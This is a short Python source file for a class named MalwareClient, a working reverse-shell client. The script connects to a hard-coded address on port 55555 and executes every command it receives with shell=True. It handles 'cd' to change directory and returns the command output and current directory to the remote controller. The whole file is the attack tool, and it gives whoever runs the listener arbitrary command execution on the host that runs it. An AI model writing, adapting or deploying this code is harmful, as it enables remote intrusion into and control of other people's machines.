import socket
import os
import subprocess

class MalwareClient:
    """Client for socket

    """

    def __init__(self, sock=None):
        if sock is None:
            self.sock = socket.socket(
                            socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

    def connect(self, host = "192.168.1.108", port = 55555):
        self.sock.connect((host, port))

    def receive(self, bufSize = 20480):
  
        while True:
            data = self.sock.recv(bufSize)

            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))

            if len(data) > 0:
                rcmd = data.decode("utf-8")
                cmd = subprocess.Popen(rcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()

                output_str = str(output_byte, "utf-8")

                cwd = "[" + os.getcwd() + "]$"
                print(output_str + cwd)
                self.sock.send(str.encode(output_str + cwd))


def main():
    c = MalwareClient()
    c.connect()
    c.receive()


if __name__ == "__main__":
    main()
